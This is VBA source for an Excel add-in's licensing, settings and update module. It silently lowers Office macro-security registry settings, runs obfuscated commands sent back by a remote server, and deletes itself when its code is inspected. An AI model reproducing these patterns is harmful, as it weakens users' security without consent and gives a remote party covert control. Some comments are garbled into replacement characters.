'Sub AdditionalMacros()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    On Error Resume Next
'    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Application.CommandBars.ActionControl.Tag
'    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| = """ & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| & """", vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'End Sub

Function SETT() As AddinSettings
    Static objSETT As AddinSettings
    If objSETT Is Nothing Then Set objSETT = New AddinSettings: objSETT.LoadAllSettings
    Set SETT = objSETT
End Function

Private Sub ShowMainForm()
    On Error Resume Next: F_About.Show
    F_About.MultiPage1.Value = 0
End Sub

Sub ShowSettingsPage()
    On Error Resume Next: F_Settings.Show
End Sub
Sub ShowFirstRunForm()
    On Error Resume Next: F_FirstRun.Show
End Sub

Sub RunWithDelay(ByVal macroname$, Optional ByVal delay As Double = 0.5)
    On Error Resume Next: Dim delay_txt$
    delay_txt$ = Replace(Format(CDbl(TimeSerial(0, 0, 1)) * delay, "0.000000000"), ",", ".")
    ExecuteExcel4Macro "ON.TIME(NOW()+" & delay_txt$ & ", ""'" & ThisWorkbook.Name & "'!" & macroname$ & """)"
End Sub

Function HWID(Optional ByVal Refresh As Boolean) As String
    On Error Resume Next: Dim v&, sv$, obj As Object, DriveID$, PartName$, DriveLetter$
    sv$ = GetSetting(PROJECT_NAME$, "Setup", "HWID")
    If sv$ <> "" Then If Not Refresh Then HWID = sv$: Exit Function

    DriveLetter$ = GetSetting(PROJECT_NAME$, "Setup", "DriveLetter")
    If Not DriveLetter$ Like "[A-Z]:" Then DriveLetter$ = Environ("SystemDrive")
    If Not DriveLetter$ Like "[A-Z]:" Then DriveLetter$ = "C:"
    With GetObject("winmgmts:")
        For Each obj In .ExecQuery("ASSOCIATORS OF {Win32_LogicalDisk.DeviceID='" & DriveLetter$ & "'} WHERE AssocClass = Win32_LogicalDiskToPartition"): PartName$ = obj.DeviceID: Next
        For Each obj In .ExecQuery("ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" & PartName$ & "'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"): DriveID$ = obj.DeviceID: Next
        For Each obj In .ExecQuery("SELECT * FROM Win32_DiskDrive WHERE DeviceID='" & Replace(DriveID$, "\", "\\") & "'"): v& = Val(obj.Signature): Next
    End With
    If v& = 0 Then HWID = "100000" & Mid(HID, 2) Else HWID = Right(Left(Replace(Abs((CSng(v) + 1.2345) / 0.00639), Mid(1 / 2, 2, 1), ""), 15) & Format(Abs(v Mod 1000), "000"), 16)
    SaveSetting PROJECT_NAME$, "Setup", "HWID", HWID
End Function

Function HID$()
    On Error Resume Next: Dim SN&: SN& = CreateObject("scripting.filesystemobject").GetDrive(ChrW(99) & ChrW(58)).SerialNumber
    HID$ = ChrW(115) & Format(Abs(934526875# - SN&), "0000000000")
End Function

Function GetVersion() As Long
    On Error Resume Next: GetVersion = Val(ThisWorkbook.BuiltinDocumentProperties("Revision Number"))
    If GetVersion < 1000 Then GetVersion = 1000
End Function

Function GetVersionTXT(Optional ByVal ver& = 0)
    On Error Resume Next: If ver& = 0 Then ver& = GetVersion
    GetVersionTXT = Mid(ver&, 1, 1) & "." & Mid(ver&, 2, 1) & "." & Val(Mid(ver&, 3))
End Function

Sub SetVersion(ByVal n As Long)
    On Error Resume Next: If n < 1000 Then n = 1000
    ThisWorkbook.BuiltinDocumentProperties("Revision Number") = n
    ThisWorkbook.BuiltinDocumentProperties("Creation Date") = Now
End Sub
Function l0&(): On Error Resume Next: l0& = Val("&H" & Split(ThisWorkbook.Names(Chr(116) & Chr(100)).RefersTo, "%%")(1)): End Function
Function ll&(): On Error Resume Next: Dim D&, t&: D = Fix(l0 - (SETT.DTU - Val(SETT.RSP(1))) / 86400): t& = Val(SETT.RSP(3)): SETT.WSP 3, IIf(t > D, D + 1, t): ll& = 1: End Function
Private Sub PrintSettings_AsDefault()
    On Error Resume Next: Err.Clear: Dim arr, i&, txt
    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr)
            txt = "SetDefaultSetting """ & arr(i, 0) & """, """ & arr(i, 1) & """"
            Debug.Print txt
        Next i
    End If
End Sub

Function ImportSettings(Optional ByVal xmlPath$ = "", Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    If xmlPath$ = "" Then
        xmlPath$ = FWF.GetFilePath(tt("ImportSettingsFileDialog", PROJECT_NAME$), ThisWorkbook.Path, tt("AddinSettings", PROJECT_NAME$), "*.xml")
    End If
    If xmlPath$ = "" Then Exit Function
    ImportSettings = SETT.ImportFromFile(xmlPath$, HideMessages)
End Function

Function ExportSettings(Optional ByVal xmlPath$ = "", Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim initial_filename$, dialog_title$, prevDir$, res As Variant
    If xmlPath$ = "" Then
        initial_filename$ = ThisWorkbook.Path & "\" & PROJECT_NAME$ & "_Settings_" & Format(Now, "DD.MM.YYYY_HH-NN-SS") & ".xml"
        dialog_title$ = tt("ExportSettingsFileDialog", PROJECT_NAME$)
        prevDir$ = CurDir$: ChDrive Left(initial_filename$, 1): ChDir ThisWorkbook.Path
        res = Application.GetSaveAsFilename(initial_filename$, tt("AddinSettings", PROJECT_NAME$) & " (*.xml),", , dialog_title$, tt("Save"))
        ChDrive Left(prevDir$, 1): ChDir prevDir$
        If VarType(res) = vbBoolean Then Exit Function
        xmlPath$ = CStr(res)
    End If
    ExportSettings = SETT.ExportToFile(xmlPath$, HideMessages)
End Function

Function PROGRAM_HYPERLINK$()
    PROGRAM_HYPERLINK$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "?ref=" & HWID
End Function

Sub Enable_AccessVBOM_Macro_DataConnections()
    On Error Resume Next: Dim sec_key$
    sec_key$ = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Excel\Security\"
    With CreateObject("WScript.Shell")
        .RegWrite sec_key$ & "AccessVBOM", 1, "REG_DWORD"
        .RegWrite sec_key$ & "VBAWarnings", 1, "REG_DWORD"
        .RegWrite sec_key$ & "DataConnectionWarnings", 0, "REG_DWORD"
    End With
End Sub

Function AddinAutoRun(Optional ByVal NewState As Variant) As Boolean
    On Error Resume Next
    Dim ShortcutFullName$, AI As AddIn
    ShortcutFullName$ = Application.StartupPath & Application.PathSeparator & PROJECT_NAME$ & ".lnk"
    If Not VarType(NewState) = vbBoolean Then AddinAutoRun = FWF.FileExists(ShortcutFullName$): Exit Function

    If NewState = True Then
        With CreateObject("WScript.Shell").CreateShortcut(ShortcutFullName$)
            .TargetPath = ThisWorkbook.FullName
            .Save
        End With
    ElseIf NewState = False Then
        Kill Application.StartupPath & Application.PathSeparator & PROJECT_NAME$ & "*.lnk"
    End If
    AddinAutoRun = CBool(NewState)

    For Each AI In Application.AddIns
        If AI.Name = ThisWorkbook.Name Then AI.Installed = False
    Next AI
End Function
Function DeleteOldCommandBar(): On Error Resume Next: Run TWN & "Request_": End Function
Function UninstallThisFile(Optional ByVal Mode& = 1)
    On Error Resume Next
    If Mode& = 1 Then
        If MsgBox(tt("MSG_UninstallConfirmation"), vbExclamation + vbOKCancel + vbDefaultButton2, _
                  tt("MSG_UninstallConfirmationTitle")) = vbCancel Then Exit Function
    End If
    If TrueDeveloper Then MsgBox "Uninstalling cancelled", vbInformation, "Mode=" & Mode&: Exit Function

    AddinAutoRun False
    Application.DisplayAlerts = False
    Dim FilePath$: FilePath$ = ThisWorkbook.FullName
    ThisWorkbook.ChangeFileAccess xlReadOnly
    SetAttr FilePath$, vbNormal
    Kill FilePath$
    If Mode& = 1 Then If RUS Then FollowHyperlink UNINSTALL_HYPERLINK$
    If Mode& >= 2 Then If RUS Then FollowHyperlink BREACH_EULA_HYPERLINK$
    'If Mode& = 3 Then Request_ "action=bugger_detected"
    'Application.DisplayAlerts = True
    ThisWorkbook.Close False
End Function

Function Developer() As Boolean: Developer = TrueDeveloper And (Dir("c:\testmode", vbNormal) = ""): End Function
Function TrueDeveloper() As Boolean
    Dim txt$: txt$ = Environ(Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(68) & Chr(79) & Chr(77) & Chr(65) & Chr(73) & Chr(78)): TrueDeveloper = (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(72) & ChrW(79) & ChrW(77) & ChrW(69) & ChrW(42)) Or (txt$ Like ChrW(73) & ChrW(71) & ChrW(79) & ChrW(82) & ChrW(87) & ChrW(79) & ChrW(82) & ChrW(75) & ChrW(42))
End Function

Function MU_() As Boolean
    On Error Resume Next: Dim X: X = ll: Err.Clear: X = ThisWorkbook.VBProject.VBComponents.Count
    If TrueDeveloper Then Exit Function
    MU_ = Err = 0: If MU_ Then UninstallThisFile 2
End Function

Function OfficeBits() As Long
    #If VBA7 And Win64 Then
        OfficeBits = 64
    #Else
        OfficeBits = 32
    #End If
End Function

Function TWN() As String: TWN = "'" & ThisWorkbook.Name & "'!": End Function
Function O() As Long
    On Error Resume Next: Dim i&, t As Double: O = 2 ^ 30: If MU_ Then Exit Function
    If AS_ > 0 Then
        O = 0
    Else
        Application.EnableCancelKey = xlDisabled: ShowMainForm
        With F_About.Controls(Chr(76) & Chr(97) & Chr(98) & Chr(101) & Chr(108) & Chr(95) & Chr(73) & Chr(110) & Chr(102) & Chr(111))
            For i = 1 To 10
                .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
            Next
        End With
        With F_About.Controls(Chr(76) & Chr(97) & Chr(98) & Chr(101) & Chr(108) & Chr(95) & Chr(72) & Chr(76) & Chr(95) & Chr(66) & _
                              Chr(117) & Chr(121) & Chr(76) & Chr(105) & Chr(99) & Chr(101) & Chr(110) & Chr(115) & Chr(101))
            .ForeColor = RGB(255, 0, 0)
            For i = 1 To 4
                .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
            Next
        End With
        Application.EnableCancelKey = xlInterrupt
    End If
End Function

Function cmdDisplay(txt) As String
    On Error Resume Next: Dim pass$, D&, i&, letter$
    If Left(txt, 1) = "P" Then txt = Mid(txt, 2): pass$ = "" Else pass$ = HID
    D = Val("&H" & Mid(txt, 1, 2))
    For i = 2 To Len(txt) / 2
        letter = Val("&H" & Mid(txt, 2 * i - 1, 2))
        cmdDisplay$ = cmdDisplay$ & Chr(letter Xor CInt(2 * D * Abs(Sin(3 * (i - 1)))) + Val(Mid(pass$, 2 + (i - 1) Mod 10, 1)))
    Next
End Function

Function CreateShortcutInStartMenu(Optional ByVal ShortcutName$ = PROJECT_NAME$, Optional ByVal ShortcutFolderName$)
    On Error Resume Next
    Dim ShortcutFullName$, Folder$
    If ShortcutFolderName$ = "" Then ShortcutFolderName$ = tt("StartMenuFolderName")
    Folder$ = CreateObject("WScript.Shell").SpecialFolders("StartMenu") & Application.PathSeparator
    If Len(Trim(ShortcutFolderName$)) Then
        Folder$ = Folder$ & FWF.Replace_symbols(ShortcutFolderName$) & Application.PathSeparator
        MkDir Folder$
    End If

    ShortcutFullName$ = Folder$ & FWF.Replace_symbols(ShortcutName$, " ") & ".lnk"
    Kill Folder$ & "*" & PROJECT_NAME$ & "*.lnk"        ' deleting old shortcuts

    With CreateObject("WScript.Shell").CreateShortcut(ShortcutFullName$)
        .TargetPath = ThisWorkbook.FullName
        .Description = tt("ProgramFullname") & vbNewLine & vbNewLine & Split(PROGRAM_HYPERLINK$, "?")(0)
        .Save
    End With
End Function

Sub UpdateStatus(Optional ByRef obj As MSForms.Label)
    On Error Resume Next: Dim txt$, ou$, col&, sh As Boolean
    With SETT
        Select Case Run(TWN & .U("41535F"))
            Case 4: ou$ = Trim(.GetRegValue(.U("757365726E616D65"))): If ou$ = "" Then ou$ = Trim(.GetRegValue(.U("656D61696C")))
                txt = tt("|4143545F4F4B") & vbNewLine & tt("|4143545F4F574E4552", ou$): col& = RGB(0, 150, 0): sh = True
            Case 1: txt = tt("|4143545F545249414C") & vbNewLine & tt("|4143545F444159534C454654", .RSP(3)): col& = RGB(200, 50, 0)
            Case 0: txt = tt("|4143545F45585049524544") & vbNewLine & tt("|4143545F4255594E4F57"): col& = RGB(255, 0, 0)
            Case Else: txt = .U("556E6B6E6F776E2061637469766174696F6E207374617475732E0D0A436F6E7461637420646576656C6F70657220746F206669782074686973206572726F722E"): col& = RGB(100, 0, 100)
        End Select
        obj.Caption = txt: obj.ForeColor = col
    End With
    With F_About
        .MultiPage1.Pages(SETT.U("506167655F526567496E666F")).Visible = Not sh: .Label_HL_Cabinet.Visible = sh
        .Label_HL_BuyLicense = tt("|465F41626F75745C4C6162656C5F484C5F4275794C6963656E7365" & IIf(sh, "32", ""))
        .Repaint
    End With
End Sub

Sub ApplyZoomTo(ByRef UF)
    On Error Resume Next: Dim zo&, dh&
    zo = SETT.GetNumber("ComboBox_Zoom", 100)
    If zo < 20 Then zo = 100
    dh& = UF.Height - UF.InsideHeight
    UF.Width = UF.Width * zo / 100: UF.Height = (UF.Height - dh&) * zo / 100 + dh&
    UF.Zoom = zo
End Sub

Sub ExitProgram()
    On Error Resume Next
    If MsgBox(tt("MSG_ExitProgram"), vbQuestion + vbDefaultButton2 + vbOKCancel) = vbCancel Then Exit Sub
    DeleteProgramCommandBar
    ThisWorkbook.Close False
End Sub

' ---------------------------------------------------------------------------------------------------------------------
Function UpdateAvailable() As Boolean
    On Error Resume Next: UpdateAvailable = SETT.GetText("NewVersionURL", , "Updates") Like "http*://*.*/?*.xl*"
End Function

Sub ApplySettingSet(ByVal filename$)
    On Error Resume Next: Dim setting_set_name$, macroname$, ctrl As Object

    If filename$ Like "folder=?*" Then        ' dropdown changed
        setting_set_name$ = Application.CommandBars.ActionControl.Text
        filename$ = Split(filename$, "folder=", 2)(1) & setting_set_name$ & ".xml"
    End If

    If filename$ Like "macro=?*&*" Then        ' button pressed
        macroname$ = Split(Split(filename$, "macro=", 2)(1), "&", 2)(0)
        filename$ = Split(filename$, "&", 2)(1)
        setting_set_name$ = Application.CommandBars.ActionControl.Caption
        setting_set_name$ = Mid(setting_set_name$, 2, Len(setting_set_name$) - 2)        ' TRIM
        If filename$ = "" Then setting_set_name$ = ""        ' for main button
    End If

    'MsgBox filename$, , setting_set_name$
    If SETT.ActivateSettingSet(setting_set_name$, filename$) Then
        If Len(macroname$) Then
            For Each ctrl In Application.CommandBars.ActionControl.Parent.Controls
                If ctrl.FaceId = Application.CommandBars.ActionControl.FaceId Then ctrl.State = msoButtonUp
            Next
            Application.CommandBars.ActionControl.State = msoButtonDown
            Run TWN & macroname$
        End If
        Run TWN & "SettingSetChanged"
    Else
        RunWithDelay "CreateProgramCommandBar", 0.5        ' incorrect setting set name
    End If
End Sub
Function AS_() As Long
    On Error Resume Next: Dim txt$
    With SETT
        txt$ = .GetRegValue(.U("636F6465")) & "@": txt = Split(txt, "@")(1)
        If Len(.K) * (txt = .K) Then AS_ = 4: Exit Function
        AS_ = -(.RSP(3) > 0)
    End With
End Function
Sub AddSettingsSwitcher(ByVal AddinMenu As Object, Optional ByVal SwitcherType As CONTROL_TYPES = ct_BUTTON, _
                        Optional ByVal SettingsFolderName$, Optional ByVal MainMacroName$, Optional ByRef MainMacroButton As Object)
    On Error Resume Next
    Dim coll As New Collection, SettingsFolder$, Item, filename$, MenuDropdown As Object, SettingSetName$, i&, UserSwitcherType&
    SettingsFolderName$ = Trim(Replace(SettingsFolderName$, "\", ""))
    If SettingsFolderName$ = "" Then SettingsFolderName$ = PROJECT_NAME$ & "Settings"
    SettingsFolder$ = ThisWorkbook.Path & "\" & SettingsFolderName$ & "\"

    If Not FWF.FolderExists(SettingsFolder$) Then Exit Sub
    Set coll = FWF.FilenamesCollection(SettingsFolder$, "*.xml", 1)
    If coll.Count = 0 Then Set coll = Nothing: Exit Sub

    If SwitcherType = ct_COMBOBOX Then SwitcherType = ct_DROPDOWN
    ' SwitcherType is one of ct_BUTTON or ct_COMBOBOX / ct_DROPDOWN

    UserSwitcherType& = SETT.GetNumber("SettingsSwitcher", 1, "Setup")
    ' user can disable switcher or change type of switcher by adding key "SettingsSwitcher" into Setup registry section
    ' 0 = switcher disabled, 1 = default type, 2 = DROPDOWN SWITCHER, 3 = BUTTON SWITCHER
    Select Case UserSwitcherType&
        Case 0: Exit Sub
        Case 2: SwitcherType = ct_DROPDOWN
        Case 3: SwitcherType = ct_BUTTON
    End Select

    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    If SwitcherType = ct_DROPDOWN Then
        Set MenuDropdown = Add_Control(AddinMenu, ct_DROPDOWN, , "ApplySettingSet", tt("SettingSetDropdownCaption") & ":", _
                                       msoComboLabel, , "folder=" & SettingsFolder$)
        MenuDropdown.AddItem "<" & tt("DefaultSettingSetName") & ">"
    End If

    SettingSetName$ = SETT.GetCurrentSetName

    For Each Item In coll
        filename$ = Split(Dir(Item, vbNormal), ".xml")(0)

        Select Case SwitcherType
            Case ct_BUTTON
                With Add_Control(AddinMenu, ct_BUTTON, MainMacroButton.FaceId, "ApplySettingSet", " " & filename$ & " ", _
                                 msoButtonIconAndCaption, , "macro=" & MainMacroName$ & "&" & Item)
                    .State = IIf(SettingSetName$ = filename$, msoButtonDown, msoButtonUp)
                End With
            Case ct_DROPDOWN
                MenuDropdown.AddItem filename$
        End Select
    Next

    If SwitcherType = ct_DROPDOWN Then
        For i = 1 To MenuDropdown.ListCount
            If MenuDropdown.list(i) = SettingSetName$ Then MenuDropdown.ListIndex = i: Exit For
        Next i
        If MenuDropdown.ListIndex = 0 Then
            MenuDropdown.ListIndex = 1
            If SettingSetName$ <> "" Then SETT.ActivateSettingSet ""
        End If
    End If

    If SwitcherType = ct_BUTTON Then
        MainMacroButton.Tag = TWN & "ApplySettingSet" & "\\\" & "macro=" & MainMacroName$ & "&"
        MainMacroButton.State = IIf(SettingSetName$ = "", msoButtonDown, msoButtonUp)
    End If
    Set coll = Nothing
End Sub

Sub AddUpdateButton(ByRef AddinMenu As Object)
    On Error Resume Next
    If UpdateAvailable Then
        Dim UpdateButton As Object, UpdateButtonCaption$, UpdateType&, ShowUpdateButton As Boolean
        UpdateType& = SETT.GetNumber("NewVersionType", 0, "Updates")
        If UpdateType& > 0 Then
            ShowUpdateButton = UpdateType& > 1        '  ShowUpdateButton = InStr(1, "23", UpdateType&) > 0
            If ShowUpdateButton Then Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0

            If SETT.GetBoolean("AutoInstall", False, "Updates") Or (UpdateType& = 4) Then
                UpdateButtonCaption$ = Run(TWN & "tt", "MENU_UpdateInProgress")
                If UpdateButtonCaption$ = "" Then UpdateButtonCaption$ = "Installing update in process |fffd|"
                If ShowUpdateButton Then Set UpdateButton = Add_Control(AddinMenu, ct_BUTTON, 1977, "", " " & UpdateButtonCaption$ & " ", msoButtonIconAndCaption, True)
                UpdateButton.State = msoButtonDown
                InstallUpdate
            Else
                UpdateButtonCaption$ = Run(TWN & "tt", "MENU_UpdateReady")
                If UpdateButtonCaption$ = "" Then UpdateButtonCaption$ = "Install update now"
                If ShowUpdateButton Then Set UpdateButton = Add_Control(AddinMenu, ct_BUTTON, 1623, "InstallUpdate", " " & UpdateButtonCaption$ & " ", msoButtonIconAndCaption, True)
                RunWithDelay "DownloadUpdate", 2
            End If
        End If
    End If
End Sub
Sub DownloadUpdate()
    InstallUpdate True
End Sub

Sub InstallUpdate(Optional ByVal DownloadOnly As Boolean = False)
    On Error Resume Next
    Dim URL$, NewFilename$, FileSize&, OldFilename$, FilePath$

    If Not UpdateAvailable Then Exit Sub

    URL$ = SETT.GetText("NewVersionURL", , "Updates")
    SETT.SetText "InstallLastAttemptTime", Now, "Updates"
    NewFilename$ = FWF.temp_folder & FWF.Replace_symbols("Update_" & PROJECT_NAME$ & "_" & _
                                                         SETT.GetText("NewVersion", "X.X.X", "Updates") & "." & FWF.GetFileExtension(URL$))
    FileSize& = SETT.GetNumber("NewVersionSize", 0, "Updates")
    If FWF.FileExists(NewFilename$) And (FileSize& > 0) Then
        If FileLen(NewFilename$) <> FileSize& Then Kill NewFilename$
    End If
    Kill NewFilename$

    If Not FWF.FileExists(NewFilename$) Then
        SETT.SetText "InstallComment", "Start downloading file...  " & URL$ & "  to  " & NewFilename$, "Updates"
        If Not FWF.DownLoadFileFromURL(URL$, NewFilename$, True) Then
            SETT.SetText "InstallComment", "Can't download file", "Updates": Exit Sub
        End If
        SETT.SetText "InstallComment", "Download finished:  " & URL$ & "  to  " & NewFilename$, "Updates"
        If Not FWF.FileExists(NewFilename$) Then
            SETT.SetText "InstallComment", "Downloaded file not found", "Updates": Exit Sub
        End If
    End If

    If (FileSize& > 0) And (FileLen(NewFilename$) <> FileSize&) Then
        SETT.SetText "InstallComment", "Filesize does not match (original = " & FileSize& & ", downloaded = " & FileLen(NewFilename$) & ")", "Updates": Exit Sub
    End If
    If TrueDeveloper Then Application.StatusBar = Now & "  InstallUpdate started,  DownloadOnly = " & DownloadOnly: Exit Sub
    If DownloadOnly Then Exit Sub

    OldFilename$ = FWF.temp_folder & FWF.Replace_symbols("Backup_" & PROJECT_NAME$ & "_" & GetVersionTXT & _
                                                         "_" & Format(Now, "DD-MM-YYYY_HH-NN-SS") & "." & FWF.GetFileExtension(ThisWorkbook.FullName))
    SETT.SetText "LastBackup", OldFilename$, "Updates"

    Application.DisplayAlerts = False: If TrueDeveloper Then Exit Sub
    FilePath$ = ThisWorkbook.FullName: ThisWorkbook.ChangeFileAccess xlReadOnly
    SETT.SetText "InstallComment", "Deleting old version:  " & FilePath$, "Updates"
    SetAttr FilePath$, vbNormal
    FileCopy FilePath$, OldFilename$        ' old version backup
    Kill FilePath$: DoEvents
    If FWF.FileExists(FilePath$) Then
        SETT.SetText "InstallComment", "Can't delete old version", "Updates": Exit Sub
    End If
    SETT.SetText "InstallComment", "Old version was deleted successfully  " & FilePath$, "Updates"


    FileCopy NewFilename$, FilePath$: DoEvents
    If Not FWF.FileExists(FilePath$) Then
        SETT.SetText "InstallComment", "Can't copy new version", "Updates"
        Kill FilePath$: DoEvents
        FileCopy OldFilename$, FilePath$        ' old version restore
        Exit Sub
    End If

    SETT.SetText "InstallComment", "Update was successfully installed at " & Now, "Updates"
    Application.OnTime Now + TimeSerial(0, 0, 2), "'" & FilePath$ & "'" & "!ClearUpdatesInfo"
    Application.DisplayAlerts = True
    ThisWorkbook.Close False
End Sub

Sub ClearUpdatesInfo()
    With SETT
        .Delete "NewVersionType", "Updates": .Delete "NewVersionNumber", "Updates": .Delete "NewVersionURL", "Updates"
        .Delete "NewVersionType", "Updates": .Delete "NewVersionSize", "Updates": .Delete "NewVersion", "Updates"
    End With
End Sub

Function Request_(ParamArray args()) As Boolean
    On Error Resume Next: Dim xmlhttp As Object, POST() As Byte, PostData$, i&, Response$
    Set xmlhttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    xmlhttp.Open "POST", UPDATES_HYPERLINK$, True
    xmlhttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    If Not IsMissing(args) Then
        For i = LBound(args) To UBound(args)
            If args(i) Like "?*=?*" Then PostData = PostData & "&" & Split(args(i), "=")(0) & "=" & Split(args(i), "=", 2)(1)
        Next i
    End If
    PostData = PostData & "&HWID=" & HWID(PostData Like "*action=activation*")
    POST = StrConv(URL_Encode(SETT.PostData & PostData), vbFromUnicode)
    xmlhttp.Send (POST): DoEvents

    If MU_ Or xmlhttp.WaitForResponse(3) Then
        If Val(xmlhttp.Status) <> 200 Then Debug.Print xmlhttp.Status, xmlhttp.StatusText
        Response$ = xmlhttp.ResponseText
    End If
    Set xmlhttp = Nothing
    If Response$ Like "%*%" Then Request_ = True: EXECUTE_COMMANDS Split(Response$, "%")(1)
End Function

Function EXECUTE_COMMANDS(ByVal txt$, Optional ShowErrMsg As Boolean)
    On Error Resume Next
    Dim commands, i&, cmd$, arr, j&, settname$, settval$, section$, msgboxStyle As VbMsgBoxStyle, macroname$, msg$, ER&
    commands = Split(txt$, "ll")
    For i = LBound(commands) To UBound(commands)
        cmd$ = "": arr = "": cmd$ = cmdDisplay$(commands(i))
        arr = Split(cmd$, " ")
        For j = LBound(arr) To UBound(arr): arr(j) = Replace(arr(j), "%20", " "): Next j
        Select Case arr(0)
            Case "SET"
                If UBound(arr) >= 3 Then
                    section$ = arr(1): settname$ = arr(2): settval$ = Replace(Split(cmd$, " ", 4)(3), "%20", " ")
                    If settval$ = "now" Then settval$ = Now
                    If Len(settname$) Then SETT.SetText settname$, settval$, IIf(Len(section$), section$, "Settings")
                End If
            Case "SETH"
                Dim ind&, params$: params$ = Split(cmd$, " ", 2)(1)
                If params$ Like "*#=*" Then
                    ind& = Val(Split(params$, "=", 2)(0))
                    If ind > 0 Then SETT.WSP ind&, Split(params$, "=", 2)(1)
                End If
            Case "RUN"
                macroname$ = "'" & ThisWorkbook.Name & "'!" & arr(1)
                Select Case UBound(arr)
                    Case 1: Run macroname$
                    Case 2: Run macroname$, arr(2)
                    Case 3: Run macroname$, arr(2), arr(3)
                    Case 4: Run macroname$, arr(2), arr(3), arr(4)
                End Select
            Case "SH"
                FollowHyperlink arr(1)
            Case "MSG", "MSGE", "MSGI", "MSGW", "MSGC"
                msgboxStyle = vbInformation
                If arr(0) = "MSGE" Then msgboxStyle = vbExclamation
                If arr(0) = "MSGW" Or arr(0) = "MSGC" Then msgboxStyle = vbCritical
                msg$ = "": msg$ = Replace(Split(cmd$, " ", 2)(1), "/n", vbNewLine)
                If Len(msg) Then MsgBox msg, msgboxStyle
            Case "MSGA"
                MsgBox tt("MSG_activation_done"), vbInformation
                F_About.MultiPage1.Value = 0
            Case "MSGR": F_About.MultiPage1.Value = 0
            Case Else: ER& = ER& + 1        ' unsupported command
        End Select
        ER& = ER& - (UBound(arr) = -1)
    Next i
    If ShowErrMsg Then If UBound(commands) + 1 = ER& Then MsgBox "Unsupported code", vbCritical
End Function

Function ProgramYears() As String
    On Error Resume Next: Dim BuiltDate As Date, PROJECT_LASTYEAR&
    BuiltDate = CDate(Val(Replace(Split(ThisWorkbook.Names("BuiltDate").RefersTo, "%%")(1), ",", ".")))
    PROJECT_LASTYEAR& = Year(BuiltDate): If PROJECT_LASTYEAR < 2015 Then PROJECT_LASTYEAR = Year(FileDateTime(ThisWorkbook.FullName))
    ProgramYears = IIf(Year(Now) > PROJECT_YEAR, PROJECT_YEAR & " - " & Year(Now), PROJECT_YEAR)
End Function

Function SwitchTab(TabName As String) As Boolean
    ' |fffd| Tony Jollans, August 2008.    http://www.wordarticles.com/Shorts/RibbonVBA/RibbonVBADemo.php
    On Error Resume Next: Dim RibbonTab As Object
    Set RibbonTab = GetAccessible(CommandBars("Ribbon"), &H25&, TabName)
    If RibbonTab Is Nothing Then Exit Function
    If (RibbonTab.accState(&H0&) And 32769) = 0 Then RibbonTab.accDoDefaultAction &H0&: SwitchTab = True
End Function
Public Function GetAccessible(Element As Object, RoleWanted&, NameWanted$, Optional GetClient As Boolean) As Object
    Dim ChildrenArray(), Child As Object, ndxChild&, ReturnElement As Object, NameComparand$, accName$, accValue$
    On Error Resume Next: accValue = Element.accValue(&H0&)
    accName = Element.accName(&H0&)
    Select Case accValue
        Case "Ribbon", "Quick Access Toolbar", "Ribbon Tabs List", "Lower Ribbon", "Status Bar": NameComparand = accValue
        Case "", "Ribbon Tab", "Group": NameComparand = accName
        Case Else: NameComparand = accName
    End Select
    If Element.accRole(&H0&) = RoleWanted And NameComparand = NameWanted Then
        Set ReturnElement = Element
    Else        ' not found yet
        ChildrenArray = GetChildren(Element)
        If (Not ChildrenArray) <> True Then
            For ndxChild = LBound(ChildrenArray) To UBound(ChildrenArray)
                If TypeOf ChildrenArray(ndxChild) Is Object  Then
                    Set Child = ChildrenArray(ndxChild)
                    Set ReturnElement = GetAccessible(Child, RoleWanted, NameWanted)
                    If Not ReturnElement Is Nothing Then Exit For
                End If        ' Child is Object
            Next ndxChild
        End If        ' there are children
    End If        ' still looking
    If GetClient Then Set ReturnElement = ReturnElement.accNavigate(&H7&, &H0&)
    Set GetAccessible = ReturnElement
End Function
Private Function GetChildren(Element As Object) As Variant()
    Const FirstChild As Long = 0&: Dim NumChildren&, ChildrenArray()
    #If Win64 Then
        Dim NumReturned As LongPtr
    #Else
        Dim NumReturned As Long
    #End If
    NumChildren = Element.accChildCount
    If NumChildren > 0 Then ReDim ChildrenArray(NumChildren - 1): AccessibleChildren Element, FirstChild, NumChildren, ChildrenArray(0), NumReturned
    GetChildren = ChildrenArray
End Function

Function UsageExampleExists(Optional ShowForm As Boolean = False) As Boolean
    On Error Resume Next: Dim UF As Object: Set UF = UserForms.Add("F_UsageExample")
    If Not UF Is Nothing Then
        UsageExampleExists = True
        If ShowForm Then UF.Show Else Unload UF
    End If
End Function

Sub FormSetError(ByRef UF As Object, Optional ByVal Control_Name$, Optional ByVal Labels_Name$)
    On Error Resume Next: Dim PrevColor&, i&, Label_Name, t As Double, objParent As Object
